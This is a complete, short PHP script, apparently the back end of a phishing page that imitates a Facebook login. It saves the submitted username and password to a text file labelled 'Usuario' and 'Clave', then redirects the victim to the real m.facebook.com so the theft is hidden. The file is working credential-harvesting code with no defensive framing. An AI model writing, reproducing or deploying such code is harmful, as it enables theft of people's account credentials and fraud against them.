<?php
file_put_contents("saved.txt",
  "Usuario: " . $_POST['user'] .
  " | Clave: " . $_POST['pass'] .
  "\n", FILE_APPEND);
header("Location: https://m.facebook.com/");
exit();
?>
